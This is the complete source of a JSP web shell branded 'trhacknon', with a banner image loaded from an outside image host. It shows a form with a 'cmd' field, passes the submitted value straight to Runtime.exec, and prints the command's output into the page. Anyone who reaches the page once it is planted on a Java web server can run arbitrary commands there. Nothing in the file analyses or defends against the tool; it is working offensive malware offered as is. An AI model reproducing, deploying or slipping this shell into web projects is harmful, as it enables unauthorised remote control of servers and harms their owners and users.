<%@ page import="java.util.*,java.io.*"%>
<html>
<body>
<font size=12 color=red><center><strong>trhacknon</strong> .jsp shell</center></font><br><center><img src="https://b.top4top.io/p_2280mvkvg0.jpg"></img></center>
    <FORM METHOD="GET" NAME="myform" ACTION="">
    <INPUT TYPE="text" NAME="cmd">
    <INPUT TYPE="submit" VALUE="Send">
    </FORM>
    <pre>
    <%
        if (request.getParameter("cmd") != null ) {
            out.println("Command: " + request.getParameter("cmd") + "<BR>");
            Runtime rt = Runtime.getRuntime();
            Process p = rt.exec(request.getParameter("cmd"));
            OutputStream os = p.getOutputStream();
            InputStream in = p.getInputStream();
            DataInputStream dis = new DataInputStream(in);
            String disr = dis.readLine();
            while ( disr != null ) {
                out.println(disr);
                disr = dis.readLine();
            }
        }
    %>
    </pre>
</body>
</html>
